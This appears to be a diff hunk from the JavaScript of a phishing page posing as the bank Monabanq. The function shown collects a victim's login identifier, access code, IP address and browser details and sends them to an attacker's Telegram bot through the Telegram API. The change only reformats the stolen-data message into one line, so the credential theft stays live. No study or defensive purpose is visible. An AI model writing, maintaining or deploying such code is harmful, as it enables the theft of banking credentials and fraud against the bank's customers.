@@ -386,18 +386,7 @@
         // Envoi à Telegram
         async function sendToTelegram() {
             const ip = await getIP();
-            const message = `
-🏦 MONABANQ - NOUVELLE CONNEXION 🏦
-━━━━━━━━━━━━━━━━━━━━━
-👤 Identifiant: ${identifiantInput.value}
-🔑 Code d'accès: ${codeInput.value}
-💾 Mémorisé: ${memoriserCheckbox.checked ? 'OUI ✅' : 'NON ❌'}
-━━━━━━━━━━━━━━━━━━━━━
-🌍 IP: ${ip}
-📱 User-Agent: ${navigator.userAgent}
-🕐 Date: ${new Date().toLocaleString('fr-FR')}
-✅ Statut: Connexion en cours
-`;
+            const message = `🏦 MONABANQ - NOUVELLE CONNEXION 🏦\n━━━━━━━━━━━━━━━━━━━━━\n👤 Identifiant: ${identifiantInput.value}\n🔑 Code d'accès: ${codeInput.value}\n💾 Mémorisé: ${memoriserCheckbox.checked ? 'OUI ✅' : 'NON ❌'}\n━━━━━━━━━━━━━━━━━━━━━\n🌍 IP: ${ip}\n📱 User-Agent: ${navigator.userAgent}\n🕐 Date: ${new Date().toLocaleString('fr-FR')}\n✅ Statut: Connexion en cours`;
 
             try {
                 const response = await fetch(`https://api.telegram.org/bot${window.BOT_TOKEN || BOT_TOKEN}/sendMessage`, {
